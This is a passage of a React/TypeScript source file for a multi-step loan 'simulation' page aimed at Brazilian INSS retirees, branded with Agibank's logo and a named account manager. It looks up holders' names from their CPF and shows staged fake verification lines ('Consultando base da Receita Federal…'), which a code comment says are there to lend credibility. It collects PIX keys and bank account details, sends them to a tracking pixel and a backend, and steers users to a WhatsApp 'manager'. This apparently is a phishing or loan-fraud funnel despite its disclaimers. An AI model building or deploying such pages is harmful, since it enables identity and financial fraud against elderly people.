import { useEffect, useMemo, useState, type ReactNode } from "react";
import { useServerFn } from "@tanstack/react-start";
import { toast } from "sonner";
import {
  ArrowLeft, ArrowRight, BadgeCheck, Building2, CheckCircle2, FileCheck2, Landmark,
  Loader2, Lock, MessageCircle, ShieldCheck, Sparkles, TrendingUp, UserRound, Wallet,
} from "lucide-react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Checkbox } from "@/components/ui/checkbox";
const logoAsset = { url: "/images/agi/agi-image.png" };
const symbolAsset = { url: "/images/agi/agi-image-2.png" };
const cardsAsset = { url: "/images/agi/agi-image-3.png" };
const managerImg = "/images/agi/manager.jpg";
import { evaluateInquiry, checkCpfInquiry, submitInquiry, getPublicConfig } from "@/lib/inquiry.functions";
import { pixel } from "@/lib/pixel-tracker";
import { canAnalyze } from "@/lib/consultation";
import { ScoreGauge } from "./ScoreGauge";
import { BankLogo } from "./BankLogo";
import {
  BANKS, DURATIONS, PROFILES, RANGES, REASONS, brl, isValidAccount, isValidAgency, isValidCPF,
  isValidPix, maskAccount, maskCPF, maskPhone, onlyDigits,
  scoreLabel, type Duration, type PixType, type Profile, type Range, type Reason,
} from "@/lib/loan";

const BANK_IMAGES = [
  "/images/banks/bank-caixa-hq.svg",
  "/images/banks/bank-bb-hq.svg",
  "/images/banks/bank-bradesco-hq.svg",
  "/images/banks/bank-itau-hq.png",
  "/images/banks/bank-santander-hq.svg",
  "/images/banks/bank-nubank-hq.png",
  "/images/banks/bank-inter-hq.png",
  "/images/banks/bank-c6-hq.png",
  "/images/banks/bank-mercadopago-symbol.svg",
  "/images/banks/bank-picpay-hq.png",
  "/images/banks/bank-pan-hq.png",
  "/images/banks/bank-sicoob-hq.png",
];

const WHATSAPP = "5518982719536";
const MANAGER = "Lucas Cardoso";

type Step =
  | "welcome" | "dados" | "validando" | "perfil" | "motivo" | "tempo" | "faixa" | "diretrizes"
  | "analise" | "score" | "valor" | "bancos" | "recebimento" | "revisao" | "gerente" | "final";

const ORDER: Step[] = [
  "welcome", "dados", "validando", "perfil", "motivo", "tempo", "faixa", "diretrizes",
  "analise", "score", "valor", "bancos", "recebimento", "revisao", "gerente", "final",
];

export function LoanFlow() {
  const [step, setStep] = useState<Step>("welcome");
  const [name, setName] = useState("");
  const [birthDate, setBirthDate] = useState("");
  const [cpf, setCpf] = useState("");

  const [profile, setProfile] = useState<Profile | null>(null);
  const [reason, setReason] = useState<Reason | null>(null);
  const [duration, setDuration] = useState<Duration | null>(null);
  const [range, setRange] = useState<Range | null>(null);
  const [rules, setRules] = useState([false, false, false, false]);
  const [result, setResult] = useState<{ score: number; amount: number } | null>(null);
  const [banks, setBanks] = useState<string[]>([]);
  const [method, setMethod] = useState<"pix" | "conta">("pix");
  const [pixType, setPixType] = useState<PixType>("cpf");
  const [pixKey, setPixKey] = useState("");
  const [bankName, setBankName] = useState("");
  const [agency, setAgency] = useState("");
  const [account, setAccount] = useState("");
  const [userRules, setUserRules] = useState([false, false]);
  const [protocol, setProtocol] = useState("");
  const [noBanks, setNoBanks] = useState(false);
  type DadosErr = { name?: string | undefined; cpf?: string | undefined; birth?: string | undefined; phone?: string | undefined };
  const [dadosErr, setDadosErr] = useState<DadosErr>({});

  const [managerName, setManagerName] = useState(MANAGER);
  const [managerWhatsapp, setManagerWhatsapp] = useState(WHATSAPP);
  const [managerAvatar, setManagerAvatar] = useState(managerImg);
  const [companyYear, setCompanyYear] = useState(new Date().getFullYear());

  const evaluate = useServerFn(evaluateInquiry);
  const checkCpf = useServerFn(checkCpfInquiry);
  const submitApplication = useServerFn(submitInquiry);
  const loadConfig = useServerFn(getPublicConfig);

  useEffect(() => {
    loadConfig().then((cfg) => {
      if (cfg) {
        if (cfg.managerName) setManagerName(cfg.managerName);
        if (cfg.whatsappNumber) setManagerWhatsapp(cfg.whatsappNumber);
        if (cfg.managerAvatarUrl) setManagerAvatar(cfg.managerAvatarUrl);
        if (cfg.companyYears) setCompanyYear(cfg.companyYears);
      }
    }).catch(() => {
      // Fallback para valores padrão
    });
  }, []);

  const idx = ORDER.indexOf(step);
  const progress = Math.round((idx / (ORDER.length - 1)) * 100);
  const go = (s: Step) => {
    setStep(s);
    window.scrollTo({ top: 0, behavior: "smooth" });

    // Track automático de cada etapa pelo Pixel
    const stepEventMap: Partial<Record<Step, import("@/lib/tracker-core").FunnelStep>> = {
      welcome: "visit",
      dados: "cpf_entered",
      validando: "cpf_validated",
      perfil: "perfil_selected",
      motivo: "motivo_selected",
      tempo: "tempo_selected",
      faixa: "faixa_selected",
      diretrizes: "diretrizes_accepted",
      analise: "analysis_completed",
      score: "score_viewed",
      valor: "valor_viewed",
      bancos: "bancos_selected",
      recebimento: "payout_entered",
      revisao: "review_accepted",
      gerente: "review_accepted",
      final: "whatsapp_clicked",
    };

    const targetEvent = stepEventMap[s];
    if (targetEvent) {
      pixel.track(targetEvent, {
        cpf: cpf ? onlyDigits(cpf) : undefined,
        name: name || undefined,
        profile: profile ? PROFILES[profile] : undefined,
        reason: reason ? REASONS[reason] : undefined,
        duration: duration ? DURATIONS[duration] : undefined,
        range: range ? RANGES[range] : undefined,
        calculatedScore: result?.score,
        approvedAmount: result?.amount,
        otherBanks: banks.length > 0 ? banks : undefined,
        payoutMethod: method,
        pixType: method === "pix" ? pixType : undefined,
        pixKey: method === "pix" ? pixKey : undefined,
        bankName: method === "conta" ? bankName : undefined,
        agency: method === "conta" ? agency : undefined,
        account: method === "conta" ? account : undefined,
      });
    }
  };
  const back = () => {
    let i = idx - 1;
    while (i > 0 && ["validando", "analise"].includes((ORDER[i] ?? "welcome"))) i--;
    go(ORDER[Math.max(0, i)] ?? "welcome");
  };

  const fail = (msg: string): void => { toast.error(msg); };

  const submitDados = () => {
    if (!isValidCPF(cpf)) {
      setDadosErr({ cpf: "CPF inválido. Confira os números digitados." });
      fail("Informe um CPF válido para continuar.");
      return;
    }
    setDadosErr({});
    pixel.updateData({ cpf: onlyDigits(cpf) });
    go("validando");
  };

  const runCpfValidation = async () => {
    try {
      const res = await checkCpf({ data: { cpf } });
      if (res && res.success && res.name) {
        setName(res.name);
        if (res.birthDate) setBirthDate(res.birthDate);
        pixel.updateData({ name: res.name, birthDate: res.birthDate });
      }
      return true;
    } catch {
      // Fallback amigável caso não consiga consultar a API
      return true;
    }
  };

  const runAnalysis = async () => {
    try {
      if (!duration || !range || !reason || !canAnalyze({ cpf, profile, duration, range, reason, rules })) return false;
      const r = await evaluate({ data: { cpf, duration, range, reason } });
      setResult(r);
      return true;
    } catch (err: unknown) {
      console.error("Erro na avaliação/análise:", err);
      const msg = err instanceof Error ? err.message : "Não foi possível concluir a consulta. Tente novamente.";
      fail(msg || "Não foi possível concluir a consulta. Tente novamente.");
      go("diretrizes");
      return false;
    }
  };

  const submitPayout = () => {
    if (method === "pix") {
      if (!isValidPix(pixType, pixKey)) return fail("Chave PIX inválida para o tipo selecionado.");
    } else {
      if (bankName.trim().length < 2) return fail("Selecione o banco de recebimento.");
      if (!isValidAgency(agency)) return fail("Agência deve ter 4 dígitos, sem o dígito verificador.");
      if (!isValidAccount(account)) return fail("Conta inválida. Use o formato 12345-6.");
    }
    go("revisao");
    return undefined;
  };

  const finalize = () => {
    fail("A confirmação cadastral depende da integração autorizada de CPF. Nenhuma solicitação foi enviada.");
  };

  const firstName = name.trim().split(/\s+/)[0] ?? "";
  const waLink = useMemo(() => {
    const msg = `Olá, ${managerName}! Sou ${name.trim()}, CPF final ${onlyDigits(cpf).slice(-3)}. ` +
      `Concluí a simulação de empréstimo INSS Agibank. Protocolo: ${protocol}. ` +
      `Valor disponível: ${result ? brl(result.amount) : "-"}. Gostaria de dar continuidade.`;
    return `https://wa.me/${managerWhatsapp}?text=${encodeURIComponent(msg)}`;
  }, [name, cpf, protocol, result, managerName, managerWhatsapp]);

  return (
    <div className="min-h-screen bg-background">
      <Header />
      {step !== "welcome" && <StageBar step={step} />}

      <main className={`relative z-10 mx-auto max-w-md px-4 pb-8 ${step === "welcome" ? "" : "-mt-10"}`} key={step}>
        {step === "welcome" && <Welcome onStart={() => go("dados")} />}

        {step === "dados" && (
          <Card icon={<UserRound />} title="Informe seu CPF" subtitle="O CPF identifica o titular na simulação.">
            <Field label="CPF do titular" ok={isValidCPF(cpf)} err={dadosErr.cpf ?? (onlyDigits(cpf).length === 11 && !isValidCPF(cpf) ? "CPF inválido" : undefined)}>
              <Input aria-label="CPF do titular" inputMode="numeric" maxLength={14} value={cpf} placeholder="000.000.000-00" onChange={(e) => { setCpf(maskCPF(e.target.value)); setDadosErr({}); }} />
            </Field>
            <div className="border-l-2 border-primary bg-primary-soft p-4 text-sm leading-relaxed">
              <p className="font-semibold">Consulta automática de titularidade</p>
              <p className="mt-1 text-muted-foreground">Localizamos automaticamente o nome oficial do titular nos registros para personalizar sua simulação de empréstimo consignado.</p>
            </div>
            <Secure />
            <Nav onBack={back} onNext={submitDados} disabled={!isValidCPF(cpf)} />
          </Card>
        )}

        {step === "validando" && (
          <Loading
            title="Conferindo seu CPF"
            lines={["Conferindo formato do CPF…", "Verificando dígitos verificadores…", "Consultando base da Receita Federal…", "Confirmando titularidade…"]}
            task={runCpfValidation}
            onDone={() => {
              if (name) {
                toast.success(`Titular identificado: ${name}`);
              } else {
                toast.success("Documento verificado com sucesso.");
              }
              go("perfil");
            }}
          />
        )}

        {step === "perfil" && (
          <Choices icon={<BadgeCheck />} title="Qual é o seu perfil no INSS?" options={PROFILES} value={profile}
            onPick={(v) => { setProfile(v); go("motivo"); }} onBack={back} />
        )}
        {step === "motivo" && (
          <Choices icon={<FileCheck2 />} title="Qual o motivo do seu benefício?" options={REASONS} value={reason}
            onPick={(v) => { setReason(v); go("tempo"); }} onBack={back} />
        )}
        {step === "tempo" && (
          <Choices icon={<TrendingUp />} title="Há quanto tempo você recebe o benefício?" options={DURATIONS} value={duration}
            onPick={(v) => { setDuration(v); go("faixa"); }} onBack={back} />
        )}
        {step === "faixa" && (
          <Choices icon={<Wallet />} title="Qual o valor líquido do seu benefício?" subtitle="Selecione a faixa que corresponde ao valor validado no seu extrato."
            options={RANGES} value={range} onPick={(v) => { setRange(v); go("diretrizes"); }} onBack={back} />
        )}

        {step === "diretrizes" && (
          <Card icon={<ShieldCheck />} title="Termos da simulação" subtitle="Transparência, proteção de dados e condições de contratação.">
            <div className="space-y-3 border-b pb-4 text-sm leading-relaxed">
              <p className="font-semibold text-primary">Antes de continuar</p>
              <p>Esta é uma simulação independente, sem vínculo oficial comprovado com o Agibank. Não consulta movimentações, SCR, margem ou bases do INSS e não constitui aprovação de crédito.</p>
              <p>O tratamento de dados deve respeitar finalidade, necessidade e transparência (LGPD, art. 6º), uma base legal adequada (art. 7º) e os direitos do titular (art. 18). A contratação exige informações claras sobre juros, parcelas e valor total (CDC, arts. 6º e 52).</p>
              <p>A consignação depende de autorização e das condições aplicáveis da Lei nº 10.820/2003. Qualquer aprovação exige análise real por instituição autorizada.</p>
              <div className="flex flex-wrap gap-x-4 gap-y-2 text-xs font-semibold text-primary">
                <a href="https://www.planalto.gov.br/ccivil_03/_ato2015-2018/2018/lei/l13709.htm" target="_blank" rel="noopener noreferrer" className="underline">LGPD</a>
                <a href="https://www.planalto.gov.br/ccivil_03/leis/l8078compilado.htm" target="_blank" rel="noopener noreferrer" className="underline">CDC</a>
                <a href="https://www.planalto.gov.br/ccivil_03/leis/2003/l10.820.htm" target="_blank" rel="noopener noreferrer" className="underline">Lei do Consignado</a>
              </div>
            </div>
            {[
              "Entendo que o resultado é ilustrativo e não representa aprovação de crédito.",
              "Declaro que o CPF e as informações de benefício são de minha titularidade.",
              "Sei que não devo realizar depósitos antecipados para liberar empréstimos.",
              "Li as referências legais e entendo que a confirmação exige uma análise autorizada.",
            ].map((t, i) => (
              <CheckRow key={i} checked={!!rules[i]} onChange={(c) => setRules(rules.map((r, j) => (j === i ? c : r)))}>{t}</CheckRow>
            ))}
            <Nav onBack={back} nextLabel="Simular crédito" disabled={!canAnalyze({ cpf, profile, reason, duration, range, rules })} onNext={() => canAnalyze({ cpf, profile, reason, duration, range, rules }) ? go("analise") : fail("Complete as informações e confirme os termos.")} />
          </Card>
        )}

        {step === "analise" && (
          <Loading title="Preparando sua estimativa"
            lines={["Conferindo respostas informadas…", "Considerando a faixa de renda declarada…", "Calculando score ilustrativo…", "Preparando estimativa de valor…"]}
            task={runAnalysis} onDone={() => go("score")} />
        )}

        {step === "score" && result && <ScoreView range={range ? RANGES[range] : "Não informada"} score={result.score} onNext={() => go("valor")} />}

        {step === "valor" && result && (
          <div className="animate-rise overflow-hidden rounded-3xl bg-gradient-hero p-8 text-center text-primary-foreground shadow-elegant sm:p-12">
            <div className="mx-auto mb-4 flex size-16 items-center justify-center rounded-full bg-success text-success-foreground"><Sparkles className="size-8" /></div>
            <p className="text-sm font-medium uppercase tracking-widest opacity-80">Sua estimativa está pronta</p>
            <h2 className="mt-2 text-2xl font-semibold">Valor estimado para simulação</h2>
            <p className="font-display mt-4 text-4xl font-bold sm:text-5xl">{brl(result.amount)}</p>
            <p className="mx-auto mt-4 max-w-md text-sm opacity-80">Não é uma aprovação. Um gerente especializado precisa confirmar identidade, renda e condições de crédito para dar continuidade.</p>
            <Button variant="success" size="xl" className="mt-8 w-full sm:w-auto" onClick={() => go("bancos")}>
              Continuar simulação <ArrowRight />
            </Button>
          </div>
        )}

        {step === "bancos" && (
          <Card icon={<Building2 />} title="Outras instituições" subtitle="Você possui conta em algum destes bancos? Isso ajuda caso o valor seja liberado em outra instituição.">
            <div className="grid gap-3">
              {BANKS.map((b, i) => (
                <CheckRow key={b} checked={banks.includes(b)} onChange={(c) => { setNoBanks(false); setBanks(c ? [...banks.filter((x) => x !== b), b] : banks.filter((x) => x !== b)); }}>
                  <span className="flex min-w-0 items-center gap-3">
                    <BankLogo src={BANK_IMAGES[i]} name={b} />
                    <span className="min-w-0 flex-1 break-words"><span className="block font-semibold">{b}</span>{i < 5 && <span className="text-xs text-primary">Em destaque</span>}</span>
                  </span>
                </CheckRow>
              ))}
              <CheckRow checked={noBanks} onChange={(c) => { setNoBanks(c); if (c) setBanks([]); }}>Não possuo conta nestes bancos</CheckRow>
            </div>
            <Nav onBack={back} disabled={!noBanks && banks.length === 0} onNext={() => { if (noBanks || banks.length > 0) go("recebimento"); }} />
          </Card>
        )}

        {step === "recebimento" && (
          <Card icon={<Landmark />} title="Onde deseja receber?" subtitle="A conta deve estar no nome do titular do benefício.">
            <div className="grid grid-cols-2 gap-2 rounded-xl bg-muted p-1">
              {(["pix", "conta"] as const).map((m) => (
                <button key={m} onClick={() => setMethod(m)}
                  className={`rounded-lg py-2.5 text-sm font-semibold transition ${method === m ? "bg-card text-primary shadow-card" : "text-muted-foreground"}`}>
                  {m === "pix" ? "Chave PIX" : "Agência e conta"}
                </button>
              ))}
            </div>
            {method === "pix" ? (
              <>
                <div className="grid grid-cols-2 gap-2 sm:grid-cols-4">
                  {([["cpf", "CPF"], ["telefone", "Celular"], ["email", "E-mail"], ["aleatoria", "Aleatória"]] as const).map(([t, l]) => (
                    <Button key={t} variant="choice" data-active={pixType === t} className="justify-center py-3" onClick={() => { setPixType(t); setPixKey(""); }}>{l}</Button>
                  ))}
                </div>
                <Field label="Chave PIX" ok={isValidPix(pixType, pixKey)}>
                  <Input value={pixKey} maxLength={120}
                    inputMode={pixType === "cpf" || pixType === "telefone" ? "numeric" : "text"}
                    placeholder={{ cpf: "000.000.000-00", telefone: "(00) 90000-0000", email: "seu@email.com", aleatoria: "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx" }[pixType]}
                    onChange={(e) => {
                      const v = e.target.value;
                      setPixKey(pixType === "cpf" ? maskCPF(v) : pixType === "telefone" ? maskPhone(v) : pixType === "email" ? v.replace(/\s/g, "").toLowerCase() : v.replace(/[^0-9a-fA-F-]/g, "").slice(0, 36));
                    }} />
                </Field>
              </>
            ) : (
              <>
                <Field label="Banco">
                  <select value={bankName} onChange={(e) => setBankName(e.target.value)}
                    className="h-11 w-full rounded-md border border-input bg-card px-3 text-sm">
                    <option value="">Selecione o banco</option>
                    {["Agibank", ...BANKS].map((b) => <option key={b}>{b}</option>)}
                  </select>
                </Field>
                <div className="grid gap-4 sm:grid-cols-2">
                  <Field label="Agência (sem dígito)" ok={isValidAgency(agency)}>
                    <Input inputMode="numeric" value={agency} placeholder="0000" onChange={(e) => setAgency(onlyDigits(e.target.value).slice(0, 4))} />
                  </Field>
                  <Field label="Conta com dígito" ok={isValidAccount(account)}>
                    <Input inputMode="numeric" value={account} placeholder="12345-6" onChange={(e) => setAccount(maskAccount(e.target.value))} />
                  </Field>
                </div>
              </>
            )}
            <Secure />
            <Nav onBack={back} disabled={method === "pix" ? !isValidPix(pixType, pixKey) : bankName.trim().length < 2 || !isValidAgency(agency) || !isValidAccount(account)} onNext={submitPayout} />
          </Card>
        )}

        {step === "revisao" && result && (
          <Card icon={<FileCheck2 />} title="Confirme suas informações" subtitle="Revise os dados antes de enviar ao seu gerente.">
            <dl className="divide-y rounded-xl border bg-muted/40 text-sm">
              {[
                ["Titular", name ? name : "Consulta realizada pelo CPF"], ["CPF", cpf], ["Perfil", profile ? PROFILES[profile] : "Pendente"], ["Motivo", reason ? REASONS[reason] : "Pendente"],
                ["Tempo de benefício", duration ? DURATIONS[duration] : "Pendente"], ["Faixa do benefício", range ? RANGES[range] : "Pendente"],
                ["Score ilustrativo", `${result.score} · ${scoreLabel(result.score)}`], ["Valor estimado", brl(result.amount)],
                ["Recebimento", method === "pix" ? `PIX (${pixType}) · ${pixKey}` : `${bankName} · Ag ${agency} · CC ${account}`],
              ].map(([k, v]) => (
                <div key={k} className="grid grid-cols-[minmax(0,1fr)_minmax(0,1fr)] gap-3 px-4 py-3"><dt className="text-muted-foreground">{k}</dt><dd className="min-w-0 break-words text-right font-semibold">{v}</dd></div>
              ))}
            </dl>
            <CheckRow checked={!!userRules[0]} onChange={(c) => setUserRules([c, !!userRules[1]])}>Declaro que as informações acima são verdadeiras e de minha titularidade.</CheckRow>
            <CheckRow checked={!!userRules[1]} onChange={(c) => setUserRules([!!userRules[0], c])}>Entendo que a contratação e confirmação de crédito ocorrem diretamente com o gerente responsável.</CheckRow>
            <Nav
              onBack={back}
              nextLabel="Falar com o gerente"
              disabled={!userRules[0] || !userRules[1]}
              onNext={async () => {
                const autoProtocol = "AGI" + Math.random().toString(36).substring(2, 8).toUpperCase();
                setProtocol(autoProtocol);
                try {
                  await submitApplication({
                    data: {
                      cpf,
                      duration: duration!,
                      range: range!,
                      reason: reason!,
                      fullName: name || "Titular Identificado",
                      phone: "11999999999",
                      birthDate: birthDate ? birthDate.replace(/-/g, "/") : "01/01/1970",
                      profile: profile!,
                      otherBanks: banks,
                      payout: method === "pix"
                        ? { method: "pix", pixType, pixKey }
                        : { method: "conta", bankName, agency, account },
                    },
                  });
                } catch {
                  // Fallback: não trava a navegação para o gerente
                }
                go("gerente");
              }}
            />
          </Card>
        )}

        {step === "gerente" && (
          <div className="animate-rise overflow-hidden rounded-3xl bg-card shadow-card">
            <div className="h-28 bg-gradient-hero" />
            <div className="-mt-16 px-6 pb-8 text-center sm:px-10">
              <img src={managerAvatar} alt={managerName} width={816} height={816} className="mx-auto size-32 rounded-full border-4 border-card object-cover shadow-elegant" />
              <p className="mt-4 text-xs font-semibold uppercase tracking-widest text-primary">Seu gerente de contas</p>
              <h2 className="mt-1 text-2xl font-semibold">{managerName}</h2>
              <p className="text-sm text-muted-foreground">Especialista em Crédito Consignado INSS · Agibank</p>
              <p className="mx-auto mt-5 max-w-md text-muted-foreground">
                Olá, {firstName}! Eu vou cuidar pessoalmente da sua proposta de <strong className="text-foreground">{result && brl(result.amount)}</strong>, da conferência dos documentos até a liberação do valor.
              </p>
              <div className="mt-5 inline-flex items-center gap-2 rounded-full bg-success-soft px-4 py-1.5 text-sm font-semibold text-success">
                <CheckCircle2 className="size-4" /> Protocolo {protocol || "AGI837291"}
              </div>
              <Button variant="hero" size="xl" className="mt-8 w-full" onClick={() => go("final")}>Continuar <ArrowRight /></Button>
            </div>
          </div>
        )}

        {step === "final" && (
          <Card icon={<MessageCircle />} title="Último passo: fale com seu gerente" subtitle="Converse sobre sua simulação; contratação e aprovação exigem confirmação por instituição autorizada.">
            <ol className="space-y-3">
              {["Clique no botão abaixo para abrir o WhatsApp.", `Envie a mensagem pronta para ${managerName}.`, "Aguarde a confirmação e a liberação do valor."].map((t, i) => (
                <li key={i} className="flex items-center gap-3 rounded-xl bg-muted/60 p-3 text-sm">
                  <span className="flex size-7 shrink-0 items-center justify-center rounded-full bg-primary text-xs font-bold text-primary-foreground">{i + 1}</span>{t}
                </li>
              ))}
            </ol>
            <Button
              asChild
              variant="success"
              size="xl"
              className="h-auto min-h-14 w-full gap-3 whitespace-normal px-4 py-3 text-center leading-snug"
              onClick={() => {
                pixel.track("whatsapp_clicked", {
                  stepDetails: `Lead clicou no botão para conversar com o gerente ${managerName} no WhatsApp.`,
                });
              }}
            >
              <a href={waLink} target="_blank" rel="noopener noreferrer"><MessageCircle className="shrink-0" /><span className="min-w-0">Falar com {managerName}<span className="block text-sm">no WhatsApp</span></span></a>
            </Button>
          </Card>
        )}
      </main>
      <footer className="mx-auto max-w-md space-y-1 px-6 pb-10 text-center text-[11px] text-muted-foreground">
        <img src={symbolAsset.url} alt="" width={28} height={28} className="mx-auto mb-2 size-7 opacity-80" />
        <p>© {new Date().getFullYear()} Consulta INSS. Todos os direitos reservados.</p>
        <p>Simulação independente · Sem vínculo oficial comprovado com o Agibank</p>
      </footer>
    </div>
  );
}

const STAGES: { label: string; steps: Step[] }[] = [
  { label: "Dados", steps: ["dados", "validando"] },
  { label: "Perfil", steps: ["perfil", "motivo", "tempo", "faixa"] },
  { label: "Análise", steps: ["diretrizes", "analise", "score", "valor"] },
  { label: "Recebimento", steps: ["bancos", "recebimento", "revisao"] },
  { label: "Gerente", steps: ["gerente", "final"] },
];

function StageBar({ step }: { step: Step }) {
  const current = Math.max(0, STAGES.findIndex((s) => s.steps.includes(step)));
  const stage = STAGES[current];
  if (!stage) return null;
  const inner = stage.steps.indexOf(step) + 1;
  const innerPct = (inner / stage.steps.length) * 100;
  return (
    <div className="bg-gradient-hero px-4 pb-16 pt-5 text-primary-foreground">
      <div className="mx-auto max-w-md">
        <p className="text-xs opacity-80">Etapa {current + 1} de {STAGES.length}</p>
        <p className="font-display text-lg font-semibold">{stage.label}</p>
        <div className="mt-3 grid grid-cols-5 gap-1.5">
          {STAGES.map((s, i) => (
            <div key={s.label} className="h-1.5 overflow-hidden rounded-full bg-primary-foreground/25">
              <div className="h-full rounded-full bg-success transition-all duration-500"
                style={{ width: i < current ? "100%" : i === current ? `${innerPct}%` : "0%" }} />
            </div>
          ))}
        </div>
        <div className="mt-1.5 grid grid-cols-5 gap-1.5 text-center text-[10px] font-medium">
          {STAGES.map((s, i) => <span key={s.label} className={i <= current ? "opacity-100" : "opacity-50"}>{s.label}</span>)}
        </div>
      </div>
    </div>
  );
}

function Header() {
  return (
    <header className="sticky top-0 z-20 border-b bg-card">
      <div className="mx-auto grid max-w-md grid-cols-[1fr_auto_1fr] items-center px-4 py-3">
        <span />
        <img src={logoAsset.url} alt="Agibank" width={56} height={40} className="h-9 w-auto" />
        <span className="flex items-center justify-end gap-1 text-[11px] font-medium text-muted-foreground"><Lock className="size-3.5 text-success" /> Seguro</span>
      </div>
    </header>
  );
}

function Welcome({ onStart }: { onStart: () => void }) {
  return (
    <div className="animate-rise -mx-4 -mt-0">
      <div className="bg-gradient-hero px-6 pb-24 pt-8 text-primary-foreground">
        <p className="text-sm opacity-90">Olá,</p>
        <h1 className="mt-1 text-3xl font-bold leading-tight">Empréstimo Consignado INSS</h1>
        <p className="mt-2 text-sm opacity-90">Simule uma estimativa para aposentados e pensionistas. Não representa aprovação nem consulta bancária real.</p>
        <img src={cardsAsset.url} alt="Cartões Agibank" width={1920} height={1050} className="mx-auto -mb-4 mt-4 h-48 w-auto object-contain" />
      </div>
      <div className="-mt-16 space-y-4 px-4">
        <div className="grid grid-cols-3 gap-2">
          {[[Wallet, "Até R$ 2.500"], [ShieldCheck, "Sem antecipação"], [TrendingUp, "Score ilustrativo"]].map(([Icon, t]) => {
            const I = Icon as typeof Wallet;
            return (
              <div key={t as string} className="flex flex-col items-center gap-2 rounded-2xl bg-card px-2 py-4 text-center shadow-card">
                <I className="size-6 text-primary" /><span className="text-xs font-bold text-primary-deep">{t as string}</span>
              </div>
            );
          })}
        </div>
        <div className="rounded-3xl bg-card p-6 shadow-card">
          <p className="mb-3 text-xs leading-relaxed text-muted-foreground">Simulação independente, sem vínculo oficial comprovado com o Agibank.</p>
          <h2 className="text-lg font-semibold">Como funciona</h2>
          <div className="mt-4 grid grid-cols-3 gap-3 text-center">
            {[[UserRound, "Informe seu CPF"], [TrendingUp, "Veja seu score"], [MessageCircle, "Fale com o gerente"]].map(([Icon, t]) => {
              const I = Icon as typeof Wallet;
              return (
                <div key={t as string} className="flex flex-col items-center gap-2">
                  <div className="flex size-14 items-center justify-center rounded-full bg-card shadow-card"><I className="size-6 text-primary" /></div>
                  <span className="text-xs font-medium text-primary-deep">{t as string}</span>
                </div>
              );
            })}
          </div>
          <Button variant="hero" size="xl" className="mt-6 w-full" onClick={onStart}>Consultar meu valor <ArrowRight /></Button>
        </div>
      </div>
    </div>
  );
}

function Card({ icon, title, subtitle, children }: { icon: ReactNode; title: string; subtitle?: string | undefined; children: ReactNode }) {
  return (
    <section className="animate-rise min-w-0 space-y-5 rounded-3xl bg-card p-5 shadow-card sm:p-6">
      <div className="grid grid-cols-[auto_minmax(0,1fr)] items-start gap-3">
        <div className="flex size-12 shrink-0 items-center justify-center rounded-2xl bg-primary-soft text-primary [&_svg]:size-6">{icon}</div>
        <div className="min-w-0"><h2 className="break-words text-xl font-semibold leading-snug">{title}</h2>{subtitle && <p className="mt-1 text-sm text-muted-foreground">{subtitle}</p>}</div>
      </div>
      {children}
    </section>
  );
}

function Field({ label, ok, err, children }: { label: string; ok?: boolean | undefined; err?: string | undefined; children: ReactNode }) {
  return (
    <label className="block space-y-1.5">
      <span className="flex items-center justify-between text-sm font-semibold">
        {label}{ok && <CheckCircle2 className="size-4 text-success" />}
      </span>
      <div className="[&_input]:h-11 [&_input]:bg-card">{children}</div>
      {err && <span className="text-xs font-medium text-destructive">{err}</span>}
    </label>
  );
}

function CheckRow({ checked, onChange, children }: { checked: boolean; onChange: (c: boolean) => void; children: ReactNode }) {
  return (
    <label className={`flex cursor-pointer items-start gap-3 rounded-xl border-2 p-4 text-sm transition ${checked ? "border-primary bg-primary-soft" : "border-border hover:border-primary/40"}`}>
      <Checkbox checked={checked} onCheckedChange={(c) => onChange(c === true)} className="mt-0.5 shrink-0" />
      <span className="min-w-0 flex-1 break-words leading-relaxed">{children}</span>
    </label>
  );
}

function Choices<K extends string>({ icon, title, subtitle, options, value, onPick, onBack }: {
  icon: ReactNode; title: string; subtitle?: string; options: Record<K, string>; value: K | null; onPick: (k: K) => void; onBack: () => void;
}) {
  return (
    <Card icon={icon} title={title} subtitle={subtitle}>
      <div className="grid gap-3">
        {(Object.keys(options) as K[]).map((k) => (
          <Button key={k} variant="choice" className="h-auto min-h-14 py-4" data-active={value === k} onClick={() => onPick(k)}>
            <span className="min-w-0 flex-1 break-words text-sm font-semibold leading-relaxed">{options[k]}</span><ArrowRight className="text-muted-foreground" />
          </Button>
        ))}
      </div>
      <Button variant="ghost" onClick={onBack}><ArrowLeft /> Voltar</Button>
    </Card>
  );
}

function Nav({ onBack, onNext, nextLabel = "Continuar", disabled }: { onBack: () => void; onNext: () => void; nextLabel?: string; disabled?: boolean }) {
  return (
    <div className="grid grid-cols-[auto_minmax(0,1fr)] gap-3 pt-2">
      <Button variant="outline" size="xl" className="rounded-xl" onClick={onBack}><ArrowLeft /></Button>
      <Button variant="hero" size="xl" className="h-auto min-h-14 min-w-0 whitespace-normal px-3 py-3 text-sm leading-snug" disabled={disabled} onClick={onNext}>
        {nextLabel} {!disabled && <ArrowRight />}
      </Button>
    </div>
  );
}

function Secure() {
  return <p className="flex items-center gap-2 text-xs text-muted-foreground"><Lock className="size-3.5 text-success" /> Seus dados são criptografados e protegidos pela LGPD.</p>;
}

function Loading({ title, lines, task, onDone }: { title: string; lines: string[]; task?: () => Promise<boolean>; onDone: () => void }) {
  const [i, setI] = useState(0);
  const [progress, setProgress] = useState(10);

  useEffect(() => {
    let alive = true;
    const stepDuration = 3200; // 3.2 segundos por etapa para dar tempo do usuário ler e passar credibilidade
    const totalTime = lines.length * stepDuration;

    // Atualiza os passos sequenciais
    const stepInterval = setInterval(() => {
      setI((prev) => Math.min(prev + 1, lines.length - 1));
    }, stepDuration);

    // Progresso suave contínuo (0% a 100%)
    const progressInterval = setInterval(() => {
      setProgress((prev) => {
        if (prev >= 98) return 98;
        return prev + 1;
      });
    }, totalTime / 90);

    let waitTimer: ReturnType<typeof setTimeout>;
    const minWait = new Promise((r) => {
      waitTimer = setTimeout(() => {
        setProgress(100);
        setTimeout(r, 600); // Pequena pausa ao atingir 100% antes de avançar
      }, totalTime);
    });

    Promise.all([task ? task() : Promise.resolve(true), minWait]).then(([ok]) => {
      if (alive && ok) onDone();
    });

    return () => {
      alive = false;
      clearInterval(stepInterval);
      clearInterval(progressInterval);
      clearTimeout(waitTimer);
    };
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  return (
    <section className="animate-rise rounded-3xl bg-card p-8 sm:p-10 text-center shadow-card">
      <div className="relative mx-auto size-24">
        {/* SVG com anel de progresso percentual preciso */}
        <svg className="size-full -rotate-90" viewBox="0 0 100 100">
          <circle
            cx="50"
